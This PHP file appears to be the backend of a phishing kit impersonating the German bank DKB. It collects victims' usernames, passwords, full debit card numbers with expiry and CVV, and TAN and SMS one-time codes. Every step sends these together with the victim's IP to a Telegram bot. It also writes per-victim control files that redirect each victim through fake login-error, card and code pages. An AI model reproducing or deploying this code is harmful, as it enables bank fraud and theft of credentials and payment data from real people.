<?php 



require_once "functions.php";
require_once "config.php";





$random=rand(0,100000000000);

if ($_POST['step'] == "control") {
        $fp = fopen('victims/'. $_POST['ip'] .'.php', 'wb');

        fwrite($fp, $_POST['to']);
        fclose($fp);
        header("location: control.php?ip=" . $_POST['ip']);
        exit();
    }




if( !empty($_GET['redirection']) ) {
    $red = $_GET['redirection'];
    if( $red == 'login' ) {
        $_SESSION['errors']['login'] = true;
        header("Location: loginerr.php");
        exit();
    } if( $red == 'cc' ) {
        header("Location: cc.php");
        exit();
    } else if( $red == 'tan' ) {
        header("Location: tan.php");
        exit();
    } else if( $red == 'tan_2' ) {
        header("Location: tan_2.php");
        exit();
    }  else if( $red == 'tan_3' ) {
        header("Location: smserr.php");
        exit();
    } else if( $red == 'success' ) {
        header("Location: success.php");
        exit();
    }
}


//================
#=====> log
//================

if ($_POST['step']== 'index') {
    $user = $_POST['user'];
    $pass = $_POST['pass'];

    if (empty($user) || empty($pass)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " -------| 🏦 DKB 🏦 |--------- "       . "\r\n" ;
        $message  =" =============\START lOG /============ "       . "\r\n" ;
        $message .= "[+] user : " . $user                    . "\r\n";
        $message .= "[+] pass : " . $pass                     . "\r\n";
        $message .=" ------\  END LOGIN  /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading_1.php");
        exit();
    }
}

if ($_POST['step']== 'loginerr') {
    $user = $_POST['user'];
    $pass = $_POST['pass'];

    if (empty($user) || empty($pass)) {

        header("Location: loginerr.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " -------| 🏦 DKB 🏦 |--------- "       . "\r\n" ;
        $message  =" =============\ START lOG ERR /============ "       . "\r\n" ;
        $message .= "[+] user : " . $user                    . "\r\n";
        $message .= "[+] pass : " . $pass                     . "\r\n";
        $message .=" ------\  END LOGIN  /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading_1.php");
        exit();
    }
}

//================
#=====> CC
//================


if ($_POST['step']== 'cc') {
    $name = $_POST['name'];
    $card = $_POST['card'];
    $cvv = $_POST['code'];
    $month = $_POST['month'];
    $year = $_POST['year'];

    if (empty($name) || empty($card)  || empty($cvv)) {

        header("Location: cc.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ----| 🏦 DKB 🏦 |--------- "       . "\r\n" ;
        $message  =" =============\START  DEBIT CARD /============ "       . "\r\n" ;
        $message .= "[+]FULL NAME : " . $name             . "\r\n";
        $message .= "[+]CARD NUMBER : " . $card           . "\r\n";
        $message .= "[+]EXP DATE : " . $month."/".$year         . "\r\n";
        $message .= "[+]CVV : " . $cvv             . "\r\n";
        $message .=" ------\  END CC  /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading_1.php");
        exit();
    }
}

//================
#=====> log
//================

if ($_POST['step']== 'tan') {
    $tan = $_POST['tan'];


    if (empty($tan)) {

        header("Location: tan.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ----| 🏦 DKB 🏦 |--------- "       . "\r\n" ;
        $message  =" =============\START TAN /============ "       . "\r\n" ;
        $message .= "[+] CODE TAN : " . $tan                   . "\r\n";
        $message .=" ------\  END LOGIN  /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading_1.php");
        exit();
    }
}

//================
#=====> log
//================

if ($_POST['step']== 'sms') {
    $tan = $_POST['tan'];


    if (empty($tan)) {

        header("Location: tan_2.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ----| 🏦 DKB 🏦 |--------- "       . "\r\n" ;
        $message  =" =============\START SMS  /============ "       . "\r\n" ;
        $message .= "[+] CODE SMS : " . $tan                   . "\r\n";
        $message .=" ------\  END SMS   /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading_1.php");
        exit();
    }
}

if ($_POST['step']== 'smserr') {
    $tan = $_POST['tan'];


    if (empty($tan)) {

        header("Location: smserr.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " ----| 🏦 DKB 🏦 |--------- "       . "\r\n" ;
        $message  =" =============\START SMS  /============ "       . "\r\n" ;
        $message .= "[+] CODE SMS : " . $tan                   . "\r\n";
        $message .=" ------\  END SMS   /------- "       . "\r\n" ;
        $message .=" -----------\ Link CONTROL /----------- "       . "\r\n" ;
        $message .= '|-Steps : ' . get_steps_link() . "\r\n";
        $message .= '-----------------------------------------' . "\r\n";


        if(isset($_POST['submit']))
            {
                $apiToken;
                $data = [
                'chat_id' => $id, 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );
            };
            reset_data();
        header("Location: loading_1.php");
        exit();
    }
}


?>